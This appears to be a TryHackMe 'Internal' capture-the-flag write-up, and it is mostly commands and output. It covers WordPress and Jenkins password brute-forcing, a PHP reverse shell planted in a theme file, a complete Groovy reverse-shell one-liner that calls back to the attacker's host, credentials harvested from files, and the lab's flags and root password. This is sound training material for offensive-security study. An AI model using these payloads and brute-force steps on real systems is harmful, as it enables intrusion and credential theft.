
Added THM-IP to /etc/hosts
```bash
10.48.177.23    internal.thm
```
### Rustscan:
Open ports 22, 80

```Bash
rustscan -a 10.48.177.23 -r 1-65535 -- -oN allports.txt
rustscan -a 10.48.177.23 -- -sC -sV -oN services.txt


PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpZTvmUlaHPpKH8X2SHMndoS+GsVlbhABHJt4TN/nKUSYeFEHbNzutQnj+DrUEwNMauqaWCY7vNeYguQUXLx4LM5ukMEC8IuJo0rcuKNmlyYrgBlFws3q2956v8urY7/McCFf5IsItQxurCDyfyU/erO7fO02n2iT5k7Bw2UWf8FPvM9/jahisbkA9/FQKou3mbaSANb5nSrPc7p9FbqKs1vGpFopdUTI2dl4OQ3TkQWNXpvaFl0j1ilRynu5zLr6FetD5WWZXAuCNHNmcRo/aPdoX9JXaPKGCcVywqMM/Qy+gSiiIKvmavX6rYlnRFWEp25EifIPuHQ0s8hSXqx5
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMFOI/P6nqicmk78vSNs4l+vk2+BQ0mBxB1KlJJPCYueaUExTH4Cxkqkpo/zJfZ77MHHDL5nnzTW+TO6e4mDMEw=
|   256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMlxubXGh//FE3OqdyitiEwfA2nNdCtdgLfDQxFHPyY0
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Directory bruteforce on port 80

```Bash
ffuf -u http://internal.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200-299,301,302,307 -o ffuf.txt


blog                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 780ms]
javascript              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 832ms]
phpmyadmin              [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 300ms]
wordpress               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 252ms]

```

Access /blog
### Powered by WordPress 
http://internal.thm/blog/wp-login.php

```Bash
#Wpscan to enumerate Users
wpscan --url http://internal.thm/blog/ -e

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

```

User - admin
#### Password Brute force attack on WordPress site

```Bash
wpscan --url http://internal.thm/blog/ -U admin -P /usr/share/wordlists/rockyou.txt


[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

```


### WordPress Themes to Revershell

After browsing all themes and plugins we have update file access to 
http://internal.thm/blog/wp-admin/theme-editor.php?file=404.php&theme=twentyseventeen

Pasted Revereshell code from pentest monkey

To Trigger revershell

```Bash
└─$ nc -lvnp 443 
listening on [any] 443 ...

connect to [192.168.159.0] from (UNKNOWN) [10.48.177.23] 51332
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:48:58 up 35 min,  0 users,  load average: 0.00, 0.01, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ $ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@internal:/$ ^Z
zsh: suspended  nc -lvnp 443
                                                       
┌──(kali㉿kali)-[~/Downloads/thm/internal]
└─$ stty raw -echo ; fg    
[1]  + continued  nc -lvnp 443


www-data@internal:/$ export TERM=xterm

```

#### Linpeas.sh magic

Useful wp-save.txt found !!

```Bash
www-data@internal:/$ cat /opt/wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

www-data@internal:/$ su aubreanna
password:

```

### Jenkins is running on 172.17.0.2:8080

```bash
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$ cat user.txt 
THM{int3rna1_fl4g_1}
aubreanna@internal:~$ 
```

Setting up ssh tunnel to access 172.17.0.2:8080
```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```

on Kali:
```bash
rustscan -a 127.0.0.1 -- -sC -sV 

PORT      STATE  SERVICE REASON         VERSION
80/tcp    open   http    syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 3.13.7)
|_http-title: Directory listing for /
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/3.13.7
8080/tcp  open   http    syn-ack ttl 64 Jetty 9.4.30.v20200611
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.30.v20200611)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
54328/tcp closed unknown reset ttl 64
54402/tcp closed unknown reset ttl 64
54794/tcp closed unknown reset ttl 64

```

Directory enumeration:

```bash
ffuf -u http://127.0.0.1:8080/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200-299,301,302,307 -o jenkinsffuf.txt

logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 356ms]
login                   [Status: 200, Size: 2005, Words: 198, Lines: 11, Duration: 528ms]
assets                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 371ms]
oops                    [Status: 200, Size: 6348, Words: 228, Lines: 7, Duration: 269ms]
git                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 225ms]
cli                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 391ms]

```

Access to /oops and found jenkins is running on 2.250

Jenkins default creds are admin:password it didn't work started to brute force for admin user

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password" -V -s 8080

[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
```

Logged in to jenkins now!!!

Jenkins home->script console

```groovy
String host="192.168.159.0";int port=6969;String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```

Netcat listner on kali:
```bash
└─$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [192.168.159.0] from (UNKNOWN) [10.48.177.23] 57592

```

BOOM! We got a revshell!!!

Jenkins machine - 172.17.0.2:8080

Shell stabilization:
```bash
#In Revershell
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'
jenkins@jenkins:/$ ^Z
zsh: suspended  nc -lvnp 6969

```

in kali:
```Bash
stty raw -echo ; fg
```

in stabilized shell:
```bash
jenkins@jenkins:/$ export TERM=xterm
```

### Obtaining root creds

From Linpeas we got 
```bash
╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                                                                                                                                          
drwxr-xr-x 1 root root 4096 Aug  3  2020 .
drwxr-xr-x 1 root root 4096 Aug  3  2020 ..
-rw-r--r-- 1 root root  204 Aug  3  2020 note.txt
```

```bash
jenkins@jenkins:~$ cat /opt/note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

SSH in the machine as root
```bash
ssh root@internal.thm   

root@internal:~# ls
root.txt  snap
root@internal:~# cat root.txt 
THM{d0ck3r_d3str0y3r}
root@internal:~# 
```

